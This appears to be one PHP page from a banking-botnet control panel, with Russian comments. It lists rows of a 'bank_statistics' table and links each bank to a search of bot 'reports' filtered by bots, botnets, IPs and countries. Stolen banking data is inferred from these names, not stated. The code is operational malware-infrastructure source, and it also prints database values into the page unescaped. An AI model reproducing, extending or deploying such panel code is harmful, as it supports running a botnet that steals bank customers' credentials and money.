<?php if(!defined('__CP__'))die();

define('INPUT_WIDTH', '300px');
$errors   = array();

///////////////////////////////////////////////////////////////////////////////////////////////////
// Обработка данных.
///////////////////////////////////////////////////////////////////////////////////////////////////



///////////////////////////////////////////////////////////////////////////////////////////////////
// Вывод.
///////////////////////////////////////////////////////////////////////////////////////////////////

ThemeBegin(LNG_SYS, 0, 0, 0);

echo '<table class="table_frame" style="width:400px"><tr>
<td align="left" colspan="2" class="sexy_list_title">Статистика Банков</td></tr>
';

$query='SELECT * FROM `bank_statistics`';
$datta=mysql_query($query) or die('Error');
while($row=mysql_fetch_array($datta)){
	echo'<tr><td align="left" class="sexy_dialog_text">'.$row[1].'</td>
		 <td>'.$row[2].'</td>
		 <td>'.$row[3].'</td>
		 <td><a href="mtanqste.php?rm=0&amp;m=reports_db&amp;date1=010112&amp;date2=121213&amp;bots=&amp;botnets=&amp;ips=&amp;countries=&amp;q='.$row[2].'&amp;blt=0">Найти</a></td></tr>';
}




echo'</table>';

ThemeEnd();
?>